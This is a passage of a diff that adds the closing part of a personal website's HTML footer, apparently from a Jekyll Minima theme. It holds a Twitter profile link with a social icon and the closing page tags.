+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
